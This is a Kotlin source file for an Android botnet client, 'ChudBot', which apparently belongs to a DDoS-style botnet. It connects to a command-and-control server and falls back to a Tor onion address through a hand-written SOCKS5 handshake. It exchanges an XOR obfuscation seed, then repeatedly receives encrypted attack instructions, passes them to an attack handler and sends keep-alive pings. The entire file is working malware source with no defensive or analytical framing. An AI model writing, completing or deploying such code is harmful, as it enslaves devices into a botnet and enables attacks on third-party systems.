package com.chud.loadd

import android.util.Log
import java.io.InputStream
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Proxy
import java.net.Socket
import java.net.SocketTimeoutException
import kotlin.concurrent.thread
import kotlin.random.Random

class ChudBot(
    private val cncHost: String,
    private val cncPort: Int,
    private val onionHost: String?
) {
    private var socket: Socket? = null
    private var out: OutputStream? = null
    private var `in`: InputStream? = null
    private var crypto: Crypto? = null
    @Volatile private var connected = false
    @Volatile private var running = false
    private val attackHandler = AttackHandler()
    private var mainThread: Thread? = null
    private var usingTor = false

    fun start() {
        running = true
        mainThread = thread {
            while (running) {
                try {
                    connectAndLoop()
                } catch (e: Exception) {
                    Log.e(TAG, "Connection error: ${e.message}")
                }
                Thread.sleep(10000)
            }
        }
    }

    fun stop() {
        running = false
        attackHandler.stop()
        closeSilently()
        mainThread?.interrupt()
        mainThread = null
    }

    private fun connectAndLoop() {
        usingTor = false

        try {
            Log.d(TAG, "Connecting to $cncHost:$cncPort")
            val s = Socket()
            socket = s
            s.connect(InetSocketAddress(cncHost, cncPort), 10000)
            s.soTimeout = 10000
            out = s.getOutputStream()
            `in` = s.getInputStream()
            doHandshake()
            mainLoop(s)
        } catch (_: Exception) {
            closeSilently()
            if (onionHost != null) {
                tryTorConnection()
            }
        }
    }

    private fun tryTorConnection() {
        try {
            val onion = onionHost ?: return
            Log.d(TAG, "Trying Tor fallback to $onion:$cncPort")

            val s = socks5Connect(TOR_PROXY_HOST, TOR_PROXY_PORT, onion, cncPort)
                ?: return
            socket = s
            s.soTimeout = 10000
            out = s.getOutputStream()
            `in` = s.getInputStream()
            usingTor = true
            doHandshake()
            mainLoop(s)
        } catch (_: Exception) {
            closeSilently()
        }
    }

    private fun socks5Connect(
        proxyHost: String,
        proxyPort: Int,
        targetHost: String,
        targetPort: Int
    ): Socket? {
        return try {
            val s = Socket()
            s.connect(InetSocketAddress(proxyHost, proxyPort), 5000)

            val out = s.getOutputStream()
            val input = s.getInputStream()

            // SOCKS5 greeting: version 5, 1 auth method (no auth)
            out.write(byteArrayOf(0x05, 0x01, 0x00))
            out.flush()
            val resp = ByteArray(2)
            if (readFullyRaw(input, resp, 2) != 2 || resp[0] != 0x05.toByte() || resp[1] != 0x00.toByte()) {
                s.close(); return null
            }

            // SOCKS5 CONNECT request: domain name
            val hostBytes = targetHost.toByteArray()
            val req = ByteArray(7 + hostBytes.size)
            req[0] = 0x05
            req[1] = 0x01
            req[2] = 0x00
            req[3] = 0x03
            req[4] = hostBytes.size.toByte()
            System.arraycopy(hostBytes, 0, req, 5, hostBytes.size)
            req[5 + hostBytes.size] = ((targetPort shr 8) and 0xFF).toByte()
            req[6 + hostBytes.size] = (targetPort and 0xFF).toByte()
            out.write(req)
            out.flush()

            val connResp = ByteArray(10)
            if (readFullyRaw(input, connResp, 10) != 10 || connResp[1] != 0x00.toByte()) {
                s.close(); return null
            }

            s
        } catch (_: Exception) {
            null
        }
    }

    private fun doHandshake() {
        val handshake = byteArrayOf(0x00, 0x00, 0x00, 0x01)
        val source = "android"
        val sourceBytes = source.toByteArray()

        out!!.write(handshake)
        out!!.write(sourceBytes.size)
        out!!.write(sourceBytes)

        val seed = Random.nextLong() and 0xFFFFFFFFL
        out!!.write(Crypto.uint32ToBytes(seed))
        out!!.flush()

        crypto = Crypto(seed)
        connected = true
        Log.d(TAG, "Handshake complete${if (usingTor) " (Tor)" else ""}, crypto active")
    }

    private fun mainLoop(s: Socket) {
        val pingBuf = Crypto.uint16ToBytes(0)
        var pingCount = 0

        while (running && connected && !s.isClosed) {
            try {
                val lenBuf = ByteArray(2)
                if (readFully(lenBuf, 2) != 2) break

                crypto?.xor(lenBuf, 0, 2)
                val len = Crypto.bytesToUint16(lenBuf)

                if (len > 0) {
                    if (len > 4096) { Log.e(TAG, "Invalid packet length: $len"); break }
                    val atkBuf = ByteArray(len)
                    if (readFully(atkBuf, len) != len) break
                    crypto?.xor(atkBuf, 0, len)
                    attackHandler.execute(atkBuf)
                }

                if (pingCount++ % 6 == 0) sendPing(pingBuf)
            } catch (_: SocketTimeoutException) {
                if (pingCount++ % 6 == 0) sendPing(pingBuf)
            } catch (e: Exception) {
                Log.e(TAG, "IO error: ${e.message}")
                break
            }
        }
    }

    private fun sendPing(buf: ByteArray) {
        try {
            crypto?.xor(buf, 0, 2)
            out?.write(buf)
            out?.flush()
            crypto?.xor(buf, 0, 2)
        } catch (_: Exception) {}
    }

    private fun readFully(buf: ByteArray, len: Int): Int {
        var total = 0
        while (total < len) {
            val n = `in`?.read(buf, total, len - total) ?: -1
            if (n < 0) return if (total > 0) total else -1
            total += n
        }
        return total
    }

    private fun readFullyRaw(input: InputStream, buf: ByteArray, len: Int): Int {
        var total = 0
        while (total < len) {
            val n = input.read(buf, total, len - total)
            if (n < 0) return if (total > 0) total else -1
            total += n
        }
        return total
    }

    private fun closeSilently() {
        connected = false
        try { socket?.close() } catch (_: Exception) {}
        socket = null
        out = null
        `in` = null
    }

    companion object {
        private const val TAG = "ChudNet"
        private const val TOR_PROXY_HOST = "127.0.0.1"
        private const val TOR_PROXY_PORT = 9050
    }
}
